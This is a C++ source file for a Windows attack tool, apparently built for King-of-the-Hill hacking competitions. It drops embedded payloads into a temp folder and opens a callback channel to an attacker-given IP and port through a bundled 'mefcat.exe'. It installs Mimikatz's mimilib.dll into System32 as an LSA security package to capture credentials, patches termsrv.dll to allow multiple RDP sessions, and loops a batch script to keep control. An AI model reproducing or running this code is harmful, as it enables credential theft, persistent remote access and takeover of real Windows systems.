#include "LyH.h"

AppConfig parseArguments(int argc, char* argv[]) {
	AppConfig config;
	AppConfig err;
	if (argc < 3) {
		std::cout << "Usage: " + std::string(argv[0]) + " IP PORT [--koh USERNAME] [--patch]\n";
		system("pause");
		exit(-1);
	}


	config.IP = argv[1];
	if (!std::regex_match(config.IP, IPv4_PATTERN)) {
		std::cout << "Invalid IPv4 address format\n";
		system("pause");
		exit(-1);
	}


	config.PORT = argv[2];
	if (!std::regex_match(config.PORT, PORT_PATTERN)) {
		std::cout << "Invalid port number\n";
		system("pause");
		exit(-1);
	}


	for (int i = 3; i < argc; ++i) {
		const std::string arg = argv[i];
		if (arg == "--koh") {
			if (i + 1 >= argc) {
				std::cout << "Username required after --koh\n";
				system("pause");
				exit(-1);
			}
			config.isKoH = true;
			if (std::string(argv[i + 1]) == "--patch"s) {
				std::cout << "username forgotten\n";
				system("pause");
				exit(-1);
			}
			config.username = argv[i + 1]; 
			++i; 
		}
		else if (arg == "--patch") {
			config.isPatch = true;
		}
		else {
			std::cout << "Unknown argument: " + arg <<std::endl;
			system("pause");
			exit(-1);
		}
	}

	return config;
}





int dropp3r::createTempDirectory() {
	if (fs::exists(PATH)) {
		if (!fs::remove_all(PATH)) {
			std::cout << "[dropp3r] Failed to remove existing directory: " << PATH << std::endl;
			return -1;
		}
	}fs::create_directories(PATH);
	return 0;
}
int dropp3r::dropRelations() {
	
	const std::string files[] = { 
		"patchTerm.exe"s,
		"KoH.bat"s,			
		"mefcat.exe"s,
	};

	for (int i = 1; i < 4; i++) {
		HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(i), RT_RCDATA);
		if (!hRes) return ERR_NOT_FOUND;

		HGLOBAL hData = LoadResource(NULL, hRes);
		if (!hData) return RESOURCE_NOT_LOAD;

		void* pData = LockResource(hData);
		DWORD size = SizeofResource(NULL, hRes);

		std::string outPath = PATH + "\\"s + files[i - 1];
		
		std::ofstream out(outPath, std::ios::binary | std::ios::out);

		if (!out) return NO_CREATE_FILE;

		out.write(static_cast<const char*>(pData), size);
		out.close();
		
	}

	return 0;
}


int dropp3r::loadProvider() {

	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(4), RT_RCDATA);
	if (!hRes) return ERR_NOT_FOUND;

	HGLOBAL hLoadedResource = LoadResource(NULL, hRes);
	if (!hLoadedResource) return RESOURCE_NOT_LOAD;

	void* pMim = LockResource(hLoadedResource);
	DWORD size = SizeofResource(NULL, hRes);

	LPWSTR packagePath = (LPWSTR)TEXT("c:\\windows\\system32\\mimilib.dll");
	SECURITY_PACKAGE_OPTIONS spo = {};

	HANDLE hMimilib = CreateFileW(packagePath,
		GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	DWORD wrtn = 0;
	WriteFile(hMimilib, (LPCVOID)pMim,size, &wrtn, NULL);
	CloseHandle(hMimilib);

	std::cout<<"[dropp3r] Trying to add security package . . .\n";

	SECURITY_STATUS ss = AddSecurityPackageW(packagePath, &spo);
	if (ss != SEC_E_OK) {
		if (ss == SEC_E_SECPKG_NOT_FOUND) {
			std::cout<<"[dropp3r] can't find mimilib [-]\n";
			return ERR_NOT_FOUND;
		}
		else {
			std::cout << "[dropp3r] FAILED! [-]\n";
			return ERROR;
		}
	}
	else {
		std::cout << "[dropp3r] SUCCESS! [+]\n";
	}
	return 0;

}


int kik3r::patchMultiRDP() {

	std::cout << "[kik3r] trying to patch termsrv.dll for allowing multiple rdp client. . .\n";
	
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(STARTUPINFO));
	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	if (CreateProcessA(NULL,
		(LPSTR)( (PATH + "\\patchTerm.exe"s ).c_str()),
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		(LPSTARTUPINFOA)&si,
		&pi)) {
		SleepEx(1000, FALSE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else {
		std::cout << "[kik3r] Failed to create process. Error: [-]";
		return NO_PATCH_MULTIRDP;
	}
	return 0;
}

int kik3r::kick_off() {
	std::cout << "[kik3r] Enabling  KING MODE . . .\n";
	SleepEx(5000, FALSE);
	while (true)
	{
		STARTUPINFO si = { sizeof(si) };
		PROCESS_INFORMATION pi;
		memset(&si, 0, sizeof(STARTUPINFO));
		memset(&pi, 0, sizeof(PROCESS_INFORMATION));

		if (CreateProcessA(NULL,
			(LPSTR)((PATH + "\\KoH.bat "s + Args.username).c_str()),
			NULL,
			NULL,
			FALSE,
			0,
			NULL,
			NULL,
			(LPSTARTUPINFOA)&si,
			&pi)) {
			SleepEx(1000, FALSE);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
		else {
			std::cout << "[kik3r] Failed to kick. Error: [-]";
		}
	}
}

int listen3r::buildChannel(std::string IP,std::string PORT) {

	std::string commandLine ="c:\\windows\\system32\\cmd.exe /c "s +  PATH + "mefcat.exe "s + IP + " "s + PORT;
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;

	if (CreateProcessA(NULL,
		(LPSTR)(commandLine.c_str()),
		NULL,
		NULL,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		(LPSTARTUPINFOA)(&si),
		&pi)) {
		SleepEx(5000, FALSE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	else{
		printf("Failed to create process. Error: ");
		return 1;
	}
	return 0;

}



int main(int argc, char* argv[]) {

	Args = parseArguments(argc, argv);
	dropp3r drp;
	listen3r chan;

	if (drp.createTempDirectory() || drp.dropRelations()) {

		return ERROR;
	}
	chan.buildChannel(Args.IP, Args.PORT);
	drp.loadProvider();
	if (Args.isKoH || Args.isPatch) {
		kik3r cur{};
		if (Args.isKoH) cur.kick_off();
		if (Args.isPatch) cur.patchMultiRDP();
	}

	return 0;
}
